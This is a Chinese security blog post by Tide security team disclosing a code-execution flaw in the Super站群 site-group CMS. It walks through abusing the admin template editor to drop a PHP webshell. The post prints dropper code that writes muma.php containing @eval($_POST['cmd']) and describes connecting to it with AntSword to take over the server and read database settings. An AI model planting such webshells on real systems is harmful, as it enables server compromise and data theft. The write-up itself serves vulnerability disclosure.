---
title: SUPER站群命令执行之官方审核
url: https://www.anquanke.com/post/id/283103
source: 安全客-有思想的安全新媒体
date: 2022-11-16
fetch_date: 2025-10-03T22:50:00.914364
---

# SUPER站群命令执行之官方审核

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# SUPER站群命令执行之官方审核

阅读量**481964**

发布时间 : 2022-11-15 14:30:25

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 简介

Super站群原来是我们内部自己开发使用的一套程序，后来看到很多人有相似的需求，团队决定发布出来免费开源给大家使用。 桂林思与云文化传媒有限公司Super站群最新版本存在文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。
适合用在什么场景？推荐有建站基础，懂得SEO的专业人士使用，可用于养域名养权重，关键词流量站、蜘蛛池、企业站乃至个人博客都可以使用。

![]()

## 下载程序

官网下载：<https://www.cmssuper.com/>

下载地址点击以后跳转此页面，点击下载谷歌是没有反应的，360和ie是可以的，谷歌浏览器报错
`Mixed Content: The site at '<URL>' was loaded over a secure connection, but the file at '<URL>' was loaded over an insecure connection. This file should be served over HTTPS. This download has been blocked. See <URL> for more details.` 提示遇到https和http不兼容问题

![]()

![]()

打开调试，直接点击url就可以下载或者是改成https点击下载就可以下载了。

但是官方审核到了三级验证中了，点击下载没反应就直接给驳回了。

![]()

然后我又重新在文档做了说明，并下载了安装包放到附件里边重新提交的，又要从一级审核开始。

![]()

官方大人审核，不敢多言，直接上过程。

## 搭建过程

下载安装包安装完以后，
此时登录后台程序：
地址如下：<http://sup.com/admin/#/home> 后台效果

![]()

进入后台以后：点击系统设置->模板风格->可以下载其他模板以后，点击编辑模板，站点选择该模板。

![]()

复制此段程序： 找到首页模板，复制进去，点击保存就可以了。

![]()

保存完，运行前端，会在根目录下生成文件。

![]()

会在根目录下生成muma.php

恶意代码：

```
<?php

$file=fopen("muma.php","w");//根目录创建muma.php文件
fwrite($file,'<');
fwrite($file,'?');
fwrite($file,'php');
fwrite($file,' @eval($_POST["cmd"]);');
fwrite($file,'?>');

?>
```

运行完以后，域名+muma.php

![]()

使用蚁剑链接木马，获得服务器权限：

![]()

查看数据配置信息：

![]()

## 代码分析

点击保存，获取到这个地址。

![]()

![]()

![]()

找到保存方法，获取body内容，stripslashes 函数对内容反斜杠处理，对非法内容并没有过滤。

至此，通过系统后台文件编辑，通过非法代码，运行文件，实现写入木马程序执行，拿到了服务器全部权限、源码，以及数据库信息，造成了很严重的后果。

本文翻译自 原文链接。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**Tide安全团队**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/283103](/post/id/283103)

安全KER - 有思想的安全新媒体

本文转载自:

如若转载,请注明出处：

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [命令执行](/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)
* [SUPER](/tag/SUPER)

**+1**1赞

收藏

![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)Tide安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p0.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)](/member.html?memberId=142933)

[Tide安全团队](/member.html?memberId=142933)

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT/物联网/工控安全等方向。

* 文章
* **83**

* 粉丝
* **71**

### TA的文章

* ##### [windows应急响应](/post/id/287417)

  2023-03-15 15:30:13
* ##### [初识内存取证-volatility与Easy\_dump](/post/id/287019)

  2023-03-08 14:30:12
* ##### [车联网安全入门之从CAN模拟环境搭建到重放攻击](/post/id/287021)

  2023-03-06 15:30:43
* ##### [Pwn入门之ret2libc详解](/post/id/286999)

  2023-03-06 10:30:35
* ##### [Windows Defender的一些渗透知识](/post/id/285521)

  2023-01-18 10:30:41

### 相关文章

* ##### [Java 命令执行之我见](/post/id/243329)

  2021-06-15 15:30:27
* ##### [远程命令与代码执行总结](/post/id/229611)

  2021-01-28 16:30:08
* ##### [命令执行底层原理探究-PHP（四）](/post/id/226295)

  2020-12-30 10:30:44
* ##### [命令执行底层原理探究-PHP（三）](/post/id/226294)

  2020-12-29 10:30:48
* ##### [命令执行底层原理探究-PHP（二）](/post/id/226293)

  2020-12-25 14:30:50
* ##### [命令执行底层原理探究-PHP（一）](/post/id/226292)

  2020-12-23 10:30:38
* ##### [绕过WAF运行命令执行漏洞的方法大全](/post/id/208398)

  2020-06-12 16:30:16

### 热门推荐

文章目录

* [简介](#h2-0)
* [下载程序](#h2-1)
* [搭建过程](#h2-2)
* [代码分析](#h2-3)

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)